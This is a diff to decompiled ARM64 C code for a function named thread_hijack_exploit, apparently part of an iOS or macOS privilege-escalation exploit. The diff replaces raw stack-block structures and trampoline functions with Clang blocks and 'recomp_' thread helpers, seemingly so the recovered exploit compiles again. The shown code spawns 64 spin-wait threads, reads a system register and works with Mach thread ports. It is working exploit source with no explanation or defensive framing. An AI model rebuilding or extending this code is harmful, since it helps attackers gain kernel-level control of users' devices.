@@ -1355,7 +1355,6 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   __int64 v28; // x0
   unsigned __int64 v29; // x8
   __int64 v30; // x28
-  unsigned __int64 v31; // x8
   mach_port_name_t v32; // w0
   __int64 v33; // x8
   int v34; // w21
@@ -1371,9 +1370,7 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   unsigned __int64 v44; // [xsp+78h] [xbp-3C8h]
   __int64 v45; // [xsp+88h] [xbp-3B8h]
   uintptr_t v46; // [xsp+90h] [xbp-3B0h]
-  uint64_t v47[12]; // [xsp+A8h] [xbp-398h] BYREF
   pthread_t v48; // [xsp+108h] [xbp-338h] BYREF
-  uint64_t v49[5]; // [xsp+110h] [xbp-330h] BYREF
   __int64 v50; // [xsp+138h] [xbp-308h] BYREF
   __int128 policy_info; // [xsp+140h] [xbp-300h] BYREF
   __int128 connect[2]; // [xsp+150h] [xbp-2F0h] BYREF
@@ -1531,32 +1528,21 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
           28765);
   v30 = 0;
   *(uint32_t *)(a1 + 20) = mach_thread_self();
+  void (^spinWaitBlock)(void) = ^{
+    spin_wait_el0_transition(a1);
+  };
   do
-  {
-    v49[0] = _NSConcreteStackBlock;
-    v49[1] = 3221225472LL;
-    v49[2] = spin_wait_el0_via_ptr;
-    v49[3] = &unk_44918;
-    v49[4] = a1;
-    pthread_create((pthread_t *)&v58[v30++], 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2_v2, v49);
-  }
+    pthread_create(
+      (pthread_t *)&v58[v30++],
+      0,
+      recomp_run_copied_void_block_thread,
+      recomp_copy_void_block_thread_arg(spinWaitBlock));
   while ( v30 != 64 );
-  v47[0] = _NSConcreteStackBlock;
-  v47[1] = 3221225472LL;
-  v47[2] = wait_thread_via_ptr;
-  v47[3] = &unk_44938;
-  v47[4] = a1;
-  v47[5] = &v50;
-  v31 = v44;
-  if ( v2 <= 0x918C5A833FFLL )
-    v31 = v42;
-  v47[6] = v45 + 8;
-  v47[7] = v38;
-  v47[8] = v31;
-  v47[9] = 0;
-  v47[10] = v26;
-  v47[11] = v22;
-  pthread_create(&v48, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2_v2, v47);
+  uint64_t *waitState = (uint64_t *)&v50;
+  void (^waitThreadBlock)(void) = ^{
+    wait_thread_ready(a1, &waitState);
+  };
+  pthread_create(&v48, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(waitThreadBlock));
   while ( (_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) & 0xFFC) == 0 )
   {
     v32 = mach_thread_self();
@@ -1604,24 +1590,6 @@ __int64 __fastcall thread_hijack_exploit(__int64 a1)
   return 0;
 }
 // 20: using guessed type segment_command_64 stru_20;
-
-//----- (000000000001BC54) ----------------------------------------------------
-__int64 __fastcall call_vtable_ptr_slot2_v2(__int64 a1)
-{
-  return (*(__int64 (**)(void))(a1 + 16))();
-}
-
-//----- (000000000001BC60) ----------------------------------------------------
-__int64 __fastcall spin_wait_el0_via_ptr(__int64 a1)
-{
-  return spin_wait_el0_transition(*(uint64_t *)(a1 + 32));
-}
-
-//----- (000000000001BC68) ----------------------------------------------------
-__int64 __fastcall wait_thread_via_ptr(__int64 a1)
-{
-  return wait_thread_ready(*(uint64_t *)(a1 + 32), (uint64_t **)(a1 + 40));
-}
 
 //----- (000000000001BC78) ----------------------------------------------------
 __int64 __fastcall get_task_vm_region_base(task_name_t a1)
@@ -3968,4 +3936,3 @@ LABEL_13:
   }
   return result;
 }
-
